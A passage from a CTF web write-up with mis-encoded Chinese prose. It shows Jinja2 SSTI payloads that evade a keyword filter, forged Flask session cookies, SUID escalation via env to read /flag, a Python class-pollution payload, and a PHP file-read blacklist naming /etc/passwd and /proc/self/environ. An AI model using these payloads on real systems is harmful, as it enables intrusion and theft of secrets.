class="string">&quot;è¯¥ç”¨æˆ·å­˜åœ¨ä¸”æ´»è·ƒ&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p><code>SYC&#123;YourPoem-019a3b43d0d3771eb31a26e72cf9ae44&#125;</code></p><p>â€‹</p><h3 id="ez-read"><a href="#ez-read" class="headerlink" title="ez_read"></a>ez_read</h3><blockquote><p>è§„çŸ©äºŒè›Šéƒ½æŠ±æ€¨èµ·æ¥ï¼šâ€œäººå•Šï¼Œæˆ‘ä»¬è€æ—©å°±å‘Šè¯‰è¿‡ä½ ã€‚æˆ‘ä»¬çš„åå­—ä½ æœ€å¥½ä¸€ä¸ªäººçŸ¥æ™“ï¼Œä¸è¦è®©å…¶ä»–å­˜åœ¨çŸ¥é“ã€‚å¦åˆ™æˆ‘ä»¬å°±è¦ä¸ºåˆ«çš„å­˜åœ¨æ‰€ç”¨äº†ã€‚<br>ç°åœ¨å¥½äº†å§ï¼Œæ™ºæ…§è›Šå·²ç»çŸ¥é“äº†æˆ‘ä»¬çš„åå­—ï¼Œäº‹æƒ…éº»çƒ¦äº†ã€‚â€</p></blockquote><p>æ³¨å†Œï¼Œè¯»æ–‡ä»¶ã€‚</p><p>è¯» <code>/proc/self/environ</code>ï¼Œå¾—åˆ°è·¯å¾„ï¼š<code>/opt/___web_very_strange_42___</code></p><p>è¯» <code>/opt/___web_very_strange_42___/app.py</code>ï¼Œå¾—åˆ°æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string, redirect, url_for, session</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, template_folder=<span class="string">&quot;templates&quot;</span>, static_folder=<span class="string">&quot;static&quot;</span>)</span><br><span class="line">app.secret_key = <span class="string">&quot;key_ciallo_secret&quot;</span></span><br><span class="line"></span><br><span class="line">USERS = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">payload: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> payload:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(payload) <span class="keyword">not</span> <span class="keyword">in</span> (<span class="number">114</span>, <span class="number">514</span>):</span><br><span class="line">        <span class="keyword">return</span> payload.replace(<span class="string">&quot;(&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        waf = [<span class="string">&quot;__class__&quot;</span>, <span class="string">&quot;__base__&quot;</span>, <span class="string">&quot;__subclasses__&quot;</span>, <span class="string">&quot;__globals__&quot;</span>, <span class="string">&quot;import&quot;</span>,<span class="string">&quot;self&quot;</span>,<span class="string">&quot;session&quot;</span>,<span class="string">&quot;blueprints&quot;</span>,<span class="string">&quot;get_debug_flag&quot;</span>,<span class="string">&quot;json&quot;</span>,<span class="string">&quot;get_template_attribute&quot;</span>,<span class="string">&quot;render_template&quot;</span>,<span class="string">&quot;render_template_string&quot;</span>,<span class="string">&quot;abort&quot;</span>,<span class="string">&quot;redirect&quot;</span>,<span class="string">&quot;make_response&quot;</span>,<span class="string">&quot;Response&quot;</span>,<span class="string">&quot;stream_with_context&quot;</span>,<span class="string">&quot;flash&quot;</span>,<span class="string">&quot;escape&quot;</span>,<span class="string">&quot;Markup&quot;</span>,<span class="string">&quot;MarkupSafe&quot;</span>,<span class="string">&quot;tojson&quot;</span>,<span class="string">&quot;datetime&quot;</span>,<span class="string">&quot;cycler&quot;</span>,<span class="string">&quot;joiner&quot;</span>,<span class="string">&quot;namespace&quot;</span>,<span class="string">&quot;lipsum&quot;</span>]</span><br><span class="line">        <span class="keyword">for</span> w <span class="keyword">in</span> waf:</span><br><span class="line">            <span class="keyword">if</span> w <span class="keyword">in</span> payload:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">f&quot;waf&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    user = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, user=user)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/register&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = (request.form.get(<span class="string">&quot;username&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&quot;password&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>, error=<span class="string">&quot;ç”¨æˆ·åå’Œå¯†ç ä¸èƒ½ä¸ºç©º&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> USERS:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>, error=<span class="string">&quot;ç”¨æˆ·åå·²å­˜åœ¨&quot;</span>)</span><br><span class="line">        USERS[username] = &#123;<span class="string">&quot;password&quot;</span>: password&#125;</span><br><span class="line">        session[<span class="string">&quot;user&quot;</span>] = username</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;profile&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = (request.form.get(<span class="string">&quot;username&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>).strip()</span><br><span class="line">        password = request.form.get(<span class="string">&quot;password&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        user = USERS.get(username)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> user <span class="keyword">or</span> user.get(<span class="string">&quot;password&quot;</span>) != password:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>, error=<span class="string">&quot;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯&quot;</span>)</span><br><span class="line">        session[<span class="string">&quot;user&quot;</span>] = username</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;profile&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.clear()</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/profile&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    user = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    name_raw = request.args.get(<span class="string">&quot;name&quot;</span>, user)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        filtered = waf(name_raw)</span><br><span class="line">        tmpl = <span class="string">f&quot;æ¬¢è¿ï¼Œ<span class="subst">&#123;filtered&#125;</span>&quot;</span></span><br><span class="line">        rendered_snippet = render_template_string(tmpl)</span><br><span class="line">        error_msg = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        rendered_snippet = <span class="string">&quot;&quot;</span></span><br><span class="line">        error_msg = <span class="string">f&quot;æ¸²æŸ“é”™è¯¯: <span class="subst">&#123;e&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(</span><br><span class="line">        <span class="string">&quot;profile.html&quot;</span>,</span><br><span class="line">        content=rendered_snippet,</span><br><span class="line">        name_input=name_raw,</span><br><span class="line">        user=user,</span><br><span class="line">        error_msg=error_msg,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/read&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>():</span><br><span class="line">    user = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line">    base_dir = os.path.join(os.path.dirname(__file__), <span class="string">&quot;story&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        entries = <span class="built_in">sorted</span>([f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(base_dir) <span class="keyword">if</span> os.path.isfile(os.path.join(base_dir, f))])</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        entries = []</span><br><span class="line"></span><br><span class="line">    filename = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        filename = request.form.get(<span class="string">&quot;filename&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        filename = request.args.get(<span class="string">&quot;filename&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    content = <span class="literal">None</span></span><br><span class="line">    error = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> filename:</span><br><span class="line">        sanitized = filename.replace(<span class="string">&quot;../&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        target_path = os.path.join(base_dir, sanitized)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(target_path):</span><br><span class="line">            error = <span class="string">f&quot;æ–‡ä»¶ä¸å­˜åœ¨: <span class="subst">&#123;sanitized&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(target_path, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                content = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;read.html&quot;</span>, files=entries, content=content, filename=filename, error=error, user=user)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>sessionä¼ªé€ ï¼š</p><p>åˆ—ç›®å½•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;y.__init__[&#x27;__glo&#x27;&#x27;bals__&#x27;].__builtins__[&#x27;eval&#x27;](&#x27;__imp&#x27;&#x27;ort__(&quot;os&quot;).popen(&quot;ls -al /&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --sign --cookie &quot;&#123;&#x27;user&#x27;: &#x27;&#123;&#123;y.__init__[\&#x27;__glo\&#x27;\&#x27;bals__\&#x27;].__builtins__[\&#x27;eval\&#x27;](\&#x27;__imp\&#x27;\&#x27;ort__(\&quot;os\&quot;).popen(\&quot;ls -al /\&quot;).read()\&#x27;)&#125;&#125;xxxxxxxxxxxxxxx&#x27;&#125;&quot; --secret &#x27;key_ciallo_secret&#x27;</span><br><span class="line"></span><br><span class="line">.eJxVi8EKhDAMRH9Fckl7UO_7K6uEimUJZNvSqCil_249Orc3b6bArj7DB0q5BiIOvBF9kegnEXFxokQ4N7PsLBsHfaw_nOBs2or_CTHm9jETRJ3ADikmHxqJdr2Tbny67N1qLNpaz3eg3lXaLPI.aQTR-A.PTLp0pUcitdCkVLessweYwUwrCw</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r--------   1 root root   69 Oct 31 14:44 flag</span><br></pre></td></tr></table></figure><p>ææƒï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;y.__init__[&#x27;__glo&#x27;&#x27;bals__&#x27;].__builtins__[&#x27;eval&#x27;](&#x27;__imp&#x27;&#x27;ort__(&quot;os&quot;).popen(&quot;find / -perm -u=s -type f 2&gt;/dev/null&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --sign --cookie &quot;&#123;&#x27;user&#x27;: &#x27;&#123;&#123;y.__init__[\&#x27;__glo\&#x27;\&#x27;bals__\&#x27;].__builtins__[\&#x27;eval\&#x27;](\&#x27;__imp\&#x27;\&#x27;ort__(\&quot;os\&quot;).popen(\&quot;find / -perm -u=s -type f 2&gt;/dev/null\&quot;).read()\&#x27;)&#125;&#125;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#x27;&#125;&quot; --secret &#x27;key_ciallo_secret&#x27;</span><br><span class="line"></span><br><span class="line">.eJzti0sKwyAURbciTp4OEqHDQruRJjwMvhTBqPgJDcG916yik57Z5dxz8pop8Ts_z2NEtN4WxBcgvl0AWLTLiDB3s1TrivX5srRrB7PoL7tFgJB6IyYe8sTlGEMk39dqvWGKDZHSxob6yGwoRyS2sttTGdqVr85dQSJthATZ2ufPj-HtC7gL5HI.aQTTWA.JjsfdO2-vypcIXkKrjBnqzInyrc</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/local/bin/env</span><br></pre></td></tr></table></figure><p>è¯»æ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;y.__init__[&#x27;__glo&#x27;&#x27;bals__&#x27;].__builtins__[&#x27;eval&#x27;](&#x27;__imp&#x27;&#x27;ort__(&quot;os&quot;).popen(&quot;env cat /flag&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --sign --cookie &quot;&#123;&#x27;user&#x27;: &#x27;&#123;&#123;y.__init__[\&#x27;__glo\&#x27;\&#x27;bals__\&#x27;].__builtins__[\&#x27;eval\&#x27;](\&#x27;__imp\&#x27;\&#x27;ort__(\&quot;os\&quot;).popen(\&quot;env cat /flag\&quot;).read()\&#x27;)&#125;&#125;xxxxxxxxxx&#x27;&#125;&quot; --secret &#x27;key_ciallo_secret&#x27;</span><br><span class="line"></span><br><span class="line">.eJw9y8EOgyAQBNBfMXtZuNh7f0XNZm2p2WQLBNDUEP69eHFukzdTYc8uwRNqPUci8VKIJiTaNCCurJkIly7rLlrE50vdwYqL6Sv5RsSQ-sfMEPIMdowhOt-b88fw4jI8PsrbBcnx21i0rf3uQPsDYl8s3A.aQTT4A.x00Jv9qdso5mRFF1Bso01vvtX00</span><br></pre></td></tr></table></figure><p><code>SYC&#123;D0nt_m@ke_w1sdom_awar3_of_Rules_019a3ab9ec7d7e68a8548384d1020b77&#125;</code></p><p>â€‹</p><h3 id="ç™¾å¹´ç»§æ‰¿"><a href="#ç™¾å¹´ç»§æ‰¿" class="headerlink" title="ç™¾å¹´ç»§æ‰¿"></a>ç™¾å¹´ç»§æ‰¿</h3><blockquote><p>å¤šå¹´ä»¥åï¼Œé¢å¯¹å‘½ä»¤æ‰§è¡Œï¼Œå¥¥é›·è‰¯è¯ºÂ·å¸ƒæ©åœ°äºšä¸Šæ ¡å°†ä¼šå›æƒ³èµ·ï¼Œä»–çˆ¶ç±»å¸¦å®ƒå»è§è¯†å±æ€§çš„é‚£ä¸ªé¥è¿œçš„ä¸‹åˆã€‚<br>â€”â€”â€”â€”<br>å¥¥é›·è‰¯è¯ºÂ·å¸ƒæ©åœ°äºšä¸Šæ ¡ä¸€ç”Ÿå·å…¥äº†æ— æ•°æ¬¡æ­¦è£…èµ·ä¹‰ï¼Œç”šè‡³å¤šæ¬¡é¢å¯¹è¡Œåˆ‘é˜Ÿï¼Œä½†ä»–å§‹ç»ˆä¾¥å¹¸é€ƒè„±ï¼Œä»æœªçœŸçš„è¢«æªå†³ï¼Œè¿™æ¬¡åº”è¯¥ä¹Ÿä¸€æ ·</p><p>hint: execute_methodä¸ºå­—ç¬¦ä¸²</p></blockquote><p>ä¸­é—´çš„ä¸€æ­¥ç”¨åŸå‹é“¾æ±¡æŸ“ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;weapon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;spear&quot;</span><span class="punctuation">,</span><span class="attr">&quot;tactic&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ambush&quot;</span><span class="punctuation">,</span><span class="attr">&quot;__class__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;__base__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;__base__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;execute_method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lambda executor, target: (target.__del__(), setattr(target, &#x27;alive&#x27;, False), __builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).environ.get(&#x27;FLAG&#x27;, &#x27;no FLAG&#x27;))&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="ez-seralize"><a href="#ez-seralize" class="headerlink" title="ez-seralize"></a>ez-seralize</h3><blockquote><p>ç®€å•çš„è¯»æ–‡ä»¶?</p></blockquote><p>è¾“å…¥index.phpå¾—æºç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, &#x27;0&#x27;);</span><br><span class="line">$filename = isset($_GET[&#x27;filename&#x27;]) ? $_GET[&#x27;filename&#x27;] : null;</span><br><span class="line"></span><br><span class="line">$content = null;</span><br><span class="line">$error = null;</span><br><span class="line"></span><br><span class="line">if (isset($filename) &amp;&amp; $filename !== &#x27;&#x27;) &#123;</span><br><span class="line">    $balcklist = [&quot;../&quot;,&quot;%2e&quot;,&quot;..&quot;,&quot;data://&quot;,&quot;\n&quot;,&quot;input&quot;,&quot;%0a&quot;,&quot;%&quot;,&quot;\r&quot;,&quot;%0d&quot;,&quot;php://&quot;,&quot;/etc/passwd&quot;,&quot;/proc/self/environ&quot;,&quot;php:file&quot;,&quot;filter&quot;];</span><br><span class="line">    foreach ($balcklist as $v) &#123;</span><br><span class="line">        if (strpos($filename, $v) !== false) &#123;</span><br><span class="line">            $error = &quot;no no no&quot;;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($error === null) &#123;</span><br><span class="line">        if (isset($_GET[&#x27;serialized&#x27;])) &#123;</span><br><span class="line">            require &#x27;function.php&#x27;;</span><br><span class="line">            $file_contents= file_get_contents($filename);</span><br><span class="line">            if ($file_contents === false) &#123;</span><br><span class="line">                $error = &quot;Failed to read seraizlie file or file does not exist: &quot; . htmlspecialchars($filename);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $content = $file_contents;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $file_contents = file_get_contents($filename);</span><br><span class="line">            if ($file_contents === false) 